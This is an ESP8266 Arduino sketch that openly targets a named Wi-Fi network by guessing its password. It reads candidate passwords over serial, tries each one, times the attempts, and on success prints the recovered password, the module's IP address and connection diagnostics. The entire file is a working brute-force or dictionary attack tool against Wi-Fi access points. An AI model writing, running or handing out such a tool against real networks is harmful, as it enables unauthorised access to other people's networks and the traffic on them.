#include <ESP8266WiFi.h>        // Include the Wi-Fi library

#define MAX_MESSAGE 30

const char* ssid = "KNAM"; //Enter SSID
const char* password = "password"; //Enter Password
char strValue[10];

int itNum = 0;
int ind = 0;
int seconds = 0;

void setup() {
  Serial.begin(115200);

  Serial.print("targeting ");//targeting "ssid"
  Serial.print(ssid);
  Serial.print('\n');

  while (WiFi.status() != WL_CONNECTED) 
  {
  static char buffer[MAX_MESSAGE];
  static unsigned char index = 0;
  char currentChar;

    while (Serial.available() > 0) {//try serical.avalible as a bool
      currentChar = Serial.read();
      if (currentChar == '\n'){

      Serial.print("You entered: "); //you entered "what you entered"
      Serial.print(buffer);
      Serial.print('\n');
      password = buffer;

      Serial.print("trying password number "); //trying password number "number": "password"           seconds elapsed: "seconds"
      Serial.print((itNum+1));
      Serial.print(": ");
      Serial.print(password);
      Serial.print('\n');
      Serial.print("seconds elapsed:");
      Serial.print(seconds);
      Serial.print('\n');
      Serial.print('\n');
      itNum++;
      
      WiFi.begin(ssid, password);
      delay(16850);
      seconds += 17;

      buffer[0] = 0;
      index = 0;
     } else {       
      if (index < MAX_MESSAGE-1) {
        buffer[index++] = currentChar;
        buffer[index] = 0;
       }  
      } 
     }
    }
    Serial.print("WiFi connection Successful, taking about ");//Wifi connection succesful, taking about "seconds"     The Ip address of this module is "ip"    The wifi password for "network" is "password"
    Serial.print(seconds);
    Serial.print(" seconds");
    Serial.print('\n');
    Serial.print("The IP Address of this ESP8266 Module is: ");
    Serial.print(WiFi.localIP());// Print the IP address
    Serial.print('\n');
    Serial.print("The WiFi password for the network ");
    Serial.print(ssid);
    Serial.print(" is ");
    Serial.print(password);

    Serial.print('\n'); //more information     "more information"
    Serial.print('\n');
    Serial.print('\n');
    Serial.print("More Information:");
    Serial.print('\n');
    WiFi.printDiag(Serial);
}

void loop() {

}
